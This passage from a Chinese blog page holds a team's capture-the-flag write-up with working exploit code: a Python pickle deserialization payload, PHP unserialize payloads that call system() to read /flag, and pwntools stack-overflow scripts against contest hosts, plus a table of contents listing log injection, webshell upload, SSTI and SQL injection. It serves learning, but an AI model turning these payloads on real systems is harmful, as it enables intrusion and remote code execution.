+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 直接执行ls并返回结果（适用于显示反序列化结果的场景）</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).check_output, ([<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;/flag&#x27;</span>],))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;01905ad6f2b14228be7ff6671572a99f&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="开发人员的不小心"><a href="#开发人员的不小心" class="headerlink" title="开发人员的不小心"></a>开发人员的不小心</h1><h2 id="扫描得到备份文件："><a href="#扫描得到备份文件：" class="headerlink" title="扫描得到备份文件："></a>扫描得到备份文件：</h2><p><img src="/../images/image-20250413103600446.png" alt="image-20250413103600446"></p>
+<h3 id="打开发现flag："><a href="#打开发现flag：" class="headerlink" title="打开发现flag："></a>打开发现flag：</h3><p><img src="/../images/image-20250413103540991-1744511742018-7.png" alt="image-20250413103540991"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;0195684076f54a0a9911680fbbf99a69&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="自私的小s"><a href="#自私的小s" class="headerlink" title="自私的小s"></a>自私的小s</h1><h3 id="俺还以为是字符串逃逸呢"><a href="#俺还以为是字符串逃逸呢" class="headerlink" title="俺还以为是字符串逃逸呢"></a>俺还以为是字符串逃逸呢</h3><h3 id="抓包发现在cookie里面有提醒："><a href="#抓包发现在cookie里面有提醒：" class="headerlink" title="抓包发现在cookie里面有提醒："></a>抓包发现在cookie里面有提醒：</h3><p><img src="/../images/image-20250413112404453-1744514645250-9.png" alt="image-20250413112404453"></p>
+<h3 id="访问-end-php得到路由："><a href="#访问-end-php得到路由：" class="headerlink" title="访问&#x2F;end.php得到路由："></a>访问&#x2F;end.php得到路由：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Genshin_impact</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$payload</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/end.php?payload=O:<span class="number">14</span>:<span class="string">&quot;Genshin_impact&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">21</span>:<span class="string">&quot;\00Genshin_impact\00value&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">/end.php?payload=O:<span class="number">14</span>:<span class="string">&quot;Genshin_impact&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">21</span>:<span class="string">&quot;\00Genshin_impact\00value&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">/end.php?payload=O:<span class="number">14</span>:<span class="string">&quot;Genshin_impact&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">21</span>:<span class="string">&quot;\00Genshin_impact\00value&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;9dd57f92a13547128a5bc595992219f5&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h1><p>nc 靶机 ，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h1><p>简单栈溢出，输入搭配覆盖v5就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*                                                                                                        context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p=remote(&quot;challenge.qsnctf.com&quot;,31446)</span><br><span class="line"></span><br><span class="line">system=0x401232</span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h1><p>题目提示藏有gift，打开ida查找<br>![[gift.png]]<br>看到漏洞<br>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*                                                                                                        context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p=remote(&quot;challenge.qsnctf.com&quot;,31049)</span><br><span class="line"></span><br><span class="line">system=0x4011DC</span><br><span class="line">payload=b&#x27;a&#x27;*(0x48)+p64(system)</span><br><span class="line">p.sendlineafter(b&#x27;gift?\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="借的东风破金锁"><a href="#借的东风破金锁" class="headerlink" title="借的东风破金锁"></a>借的东风破金锁</h1><p>打开ida，看见if函数条件，点击auth_code，查看它的值是53514E55435446h</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004010 46 54 43 55 4E 51 53 00       auth_code dq 53514E55435446h</span><br></pre></td></tr></table></figure>
+
+<p>丢给ai，转化为小端存储<br>![[ai.png]]<br>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;challenge.qsnctf.com&#x27;,32742)</span><br><span class="line"></span><br><span class="line">#p=process(&#x27;./key&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x46\x54\x43\x55\x4E\x51\x53\x00&#x27; + b&#x27;A&#x27;*8  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/十六夜咲夜-cute.jpg" data-sizes="auto" alt="关于curl" class="lazyload">
+          
+        
+        <a href="/2025/04/08/%E5%85%B3%E4%BA%8Ecurl/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            关于curl
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/9 eat kaki.jpg" data-sizes="auto" alt="pickle反序列" class="lazyload">
+        
+      
+      <a href="/2025/04/07/pickle%E5%8F%8D%E5%BA%8F%E5%88%97/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          pickle反序列
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Flitar%E6%88%98%E9%98%9Fwrite-up"><span class="toc-number">1.</span> <span class="toc-text">Flitar战队write-up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">战队信息：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E7%A7%B0%EF%BC%9AFlitar"><span class="toc-number">2.0.1.</span> <span class="toc-text">名称：Flitar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E5%90%8D%EF%BC%9A220"><span class="toc-number">2.0.2.</span> <span class="toc-text">排名：220</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezGame"><span class="toc-number">4.</span> <span class="toc-text">ezGame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-include"><span class="toc-number">5.</span> <span class="toc-text">baby include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">5.0.1.</span> <span class="toc-text">考察点：日志注入，文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E6%88%91%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%B8%8C%E6%9C%9B%E4%B8%8B%E6%AC%A1%E6%8E%A5%E8%A7%A6%E6%96%B0%E4%BA%8B%E7%89%A9%E4%B9%9F%E8%83%BD%E5%81%9A%E5%87%BA%E6%9D%A5%EF%BC%81"><span class="toc-number">5.0.2.</span> <span class="toc-text">这是我第一次接触日志注入，希望下次接触新事物也能做出来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">5.0.3.</span> <span class="toc-text">我的步骤：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95%E8%83%BD%E4%B8%8D%E8%83%BD%E8%AF%BB%E5%8F%96-etc-passwd"><span class="toc-number">5.0.3.1.</span> <span class="toc-text">1.测试能不能读取&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B0%9D%E8%AF%95%E9%81%8D%E5%8E%86-%EF%BC%9A"><span class="toc-number">5.0.3.2.</span> <span class="toc-text">2.尝试遍历..&#x2F;：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B0%9D%E8%AF%95%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">5.0.3.3.</span> <span class="toc-text">3.尝试伪协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B0%9D%E8%AF%95%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96filter%EF%BC%9A"><span class="toc-number">5.0.3.3.1.</span> <span class="toc-text">1.尝试直接读取filter：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96flag-php"><span class="toc-number">5.0.3.3.2.</span> <span class="toc-text">2.尝试读取flag.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%B5%8B%E8%AF%95data-input%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9D%A5RCE"><span class="toc-number">5.0.3.3.3.</span> <span class="toc-text">3.测试其他伪协议，测试data&#x2F;input伪协议来RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E%E5%8F%88%E4%B8%80%E6%9D%91%EF%BC%81"><span class="toc-number">5.0.3.3.4.</span> <span class="toc-text">4.柳暗花明又一村！</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">5.0.3.3.5.</span> <span class="toc-text">5.日志注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E9%80%9A%E8%BF%87%E4%B8%8B%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%9D%A5%E7%9B%91%E5%90%AC%EF%BC%9A"><span class="toc-number">5.0.3.3.6.</span> <span class="toc-text">6.通过下面代码来监听：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload"><span class="toc-number">6.</span> <span class="toc-text">upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%88%E7%AE%80%E5%8D%95"><span class="toc-number">6.1.</span> <span class="toc-text">很简单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">6.1.1.</span> <span class="toc-text">流程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-BP%E6%8A%93%E5%8C%85%E4%BF%AE%E6%94%B9%E4%B8%BAphp%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E3%80%82%E3%80%82%E3%80%82%E5%A4%AA%E7%AE%80%E5%8D%95%E4%BA%86%E5%90%A7"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">1.BP抓包修改为php，直接上传成功。。。太简单了吧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BA%A4%E7%BB%99%E5%89%91%E8%9A%81"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">2.交给剑蚁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%9E%E5%9C%A8%E6%89%BE%E4%B8%8D%E5%88%B0%E4%BD%8D%E7%BD%AE%EF%BC%8C%E7%9B%B4%E6%8E%A5RCE%E5%A5%BD%E4%BA%86"><span class="toc-number">6.1.1.3.</span> <span class="toc-text">3.实在找不到位置，直接RCE好了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%9F%A5%E8%AF%A2%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">6.1.1.4.</span> <span class="toc-text">4.查询环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%8F%AA%E8%83%BD%E6%85%A2%E6%85%A2%E6%89%BE%E4%BA%86%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">6.1.1.5.</span> <span class="toc-text">5.只能慢慢找了。。。。</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%95%86%E5%B8%88%E4%B8%80%E6%97%A5%E6%B8%B8"><span class="toc-number">7.</span> <span class="toc-text">商师一日游</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%82%B9%E5%87%BB%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">7.0.1.</span> <span class="toc-text">1.点击源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%91%E9%80%81cookie"><span class="toc-number">7.0.2.</span> <span class="toc-text">2.发送cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%9B%E5%85%A5%E7%BB%88%E7%AB%AF%EF%BC%8C%E5%9C%A8devtool%E4%B8%AD%E6%89%BE%E5%88%B0%E5%A4%8D%E6%B4%BB%E5%B8%81"><span class="toc-number">7.0.3.</span> <span class="toc-text">3.进入终端，在devtool中找到复活币</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%9B%B4%E6%8E%A5%E5%8F%91%E9%80%81-%E6%89%93%E5%BC%80-robots-txt"><span class="toc-number">7.0.4.</span> <span class="toc-text">4.直接发送(打开)robots.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%EF%BC%9A"><span class="toc-number">7.0.5.</span> <span class="toc-text">5.正则匹配：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-POST%E6%8F%90%E4%BA%A4"><span class="toc-number">7.0.6.</span> <span class="toc-text">6.POST提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%9F"><span class="toc-number">7.0.7.</span> <span class="toc-text">7.执行任意代码？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%8B%BC%E6%8E%A5%EF%BC%9A"><span class="toc-number">7.0.8.</span> <span class="toc-text">8.拼接：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#My-blog"><span class="toc-number">8.</span> <span class="toc-text">My blog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eeaassyy"><span class="toc-number">9.</span> <span class="toc-text">eeaassyy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%98%BF%E5%98%BF%E5%98%BF"><span class="toc-number">10.</span> <span class="toc-text">嘿嘿嘿</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">10.1.</span> <span class="toc-text">怎么这么简单。。。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-download"><span class="toc-number">11.</span> <span class="toc-text">File_download</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%B0%9D%E8%AF%95%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">11.0.1.</span> <span class="toc-text">一.尝试文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%9B%E5%85%A5%E9%A1%B5%E9%9D%A2%E5%8F%91%E7%8E%B0%E6%98%AF%E7%99%BB%E5%85%A5%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%8F%91%E7%8E%B0%E6%98%AFPOST%E4%BC%A0%E8%BE%93%EF%BC%9A"><span class="toc-number">11.0.1.1.</span> <span class="toc-text">1.进入页面发现是登入页面，输入密码抓包发现是POST传输：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%82%B9%E5%BC%80help"><span class="toc-number">11.0.1.2.</span> <span class="toc-text">2.点开help</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">11.0.1.3.</span> <span class="toc-text">3.读取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%89%BE%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%A2%98%E7%9B%AE%EF%BC%9A-RoarCTF-2019-Easy-Java"><span class="toc-number">11.0.1.4.</span> <span class="toc-text">4.找到原型题目：[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">11.0.1.5.</span> <span class="toc-text">5.读取下载文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%9C%80%E7%BB%88flag%EF%BC%9A"><span class="toc-number">11.0.1.6.</span> <span class="toc-text">6.最终flag：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%94%AF%E4%B8%80%EF%BC%9A"><span class="toc-number">12.</span> <span class="toc-text">唯一：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9ASSTIset%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="toc-number">12.0.1.</span> <span class="toc-text">考察点：SSTIset构造绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B2%A1%E6%9C%89%E6%8F%90%E9%86%92%EF%BC%8C%E5%8F%AA%E8%83%BD%E7%8C%9C%E6%B5%8B%EF%BC%9A"><span class="toc-number">12.0.2.</span> <span class="toc-text">1.没有提醒，只能猜测：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%81%9A%E9%A2%98%EF%BC%9A"><span class="toc-number">12.0.3.</span> <span class="toc-text">2.做题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">12.0.4.</span> <span class="toc-text">3.经过测试，发现过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%9D%E8%AF%95chr%E7%BB%95%E8%BF%87"><span class="toc-number">12.0.5.</span> <span class="toc-text">4.尝试chr绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B0%9D%E8%AF%95%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">12.0.6.</span> <span class="toc-text">5.尝试构造绕过：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-rce"><span class="toc-number">13.</span> <span class="toc-text">baby rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">13.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9D%91%E5%95%8A"><span class="toc-number">13.0.2.</span> <span class="toc-text">有坑啊:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%BE%93%E5%85%A5%E8%BF%99%E4%B8%AA%E6%95%B0%E5%AD%97"><span class="toc-number">14.</span> <span class="toc-text">你必须输入这个数字:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-ME"><span class="toc-number">15.</span> <span class="toc-text">RCE ME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">15.0.1.</span> <span class="toc-text">1.无过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8ls-%E5%8A%A0-nl"><span class="toc-number">15.0.2.</span> <span class="toc-text">2.使用ls   加  nl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-number">15.0.3.</span> <span class="toc-text">补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cat%E3%80%81nl%E3%80%81od-%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB"><span class="toc-number">15.0.3.1.</span> <span class="toc-text">cat、nl、od 的核心区别</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ping"><span class="toc-number">16.</span> <span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E5%B0%8F%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F"><span class="toc-number">17.</span> <span class="toc-text">小小查询系统:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%8COFFSET"><span class="toc-number">17.1.</span> <span class="toc-text">sql报错注入，大小写绕过，OFFSET</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%BD%E5%83%8F%E3%80%82%E3%80%82%E3%80%82%E6%B2%A1%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="toc-number">17.1.1.</span> <span class="toc-text">好像。。。没什么用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AEai%E6%89%8D%E7%9F%A5%E9%81%93%E5%B0%B1%E8%BF%94%E5%9B%9E%E4%BA%86%E4%B8%80%E5%8D%8A"><span class="toc-number">17.1.2.</span> <span class="toc-text">问ai才知道就返回了一半</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E6%9D%A5%E5%BE%97%E6%9F%A5%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E5%88%AB%E7%9A%84%E5%BA%93%E4%BA%86%EF%BC%81%EF%BC%81"><span class="toc-number">17.1.3.</span> <span class="toc-text">看来得查看有没有别的库了！！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%AB%E7%9A%84%E8%A1%A8%EF%BC%9A"><span class="toc-number">17.1.4.</span> <span class="toc-text">找别的表：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%97"><span class="toc-number">17.1.5.</span> <span class="toc-text">找列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%B0%B1%E4%B8%8D%E4%BF%A1%E4%BA%86%EF%BC%81"><span 